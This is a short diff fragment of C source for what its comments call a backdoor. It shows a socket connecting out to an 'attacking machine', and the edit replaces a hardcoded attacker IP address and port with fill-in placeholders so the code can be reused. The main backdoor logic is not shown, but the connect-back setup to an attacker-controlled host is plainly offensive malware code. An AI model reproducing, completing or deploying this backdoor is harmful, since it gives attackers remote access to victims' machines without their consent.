@@ -18,8 +18,8 @@ int main()
 	sock = socket(AF_INET, SOCK_STREAM, 0);
         //attacking machine setup(IP:PORT)
 	server_address.sin_family = AF_INET;
-	server_address.sin_addr.s_addr = inet_addr("192.168.16.129");
-	server_address.sin_port = htons(50005);
+	server_address.sin_addr.s_addr = inet_addr("server ip here");
+	server_address.sin_port = htons(port here);
 
 
 	//Main part: what this program do in backdoor
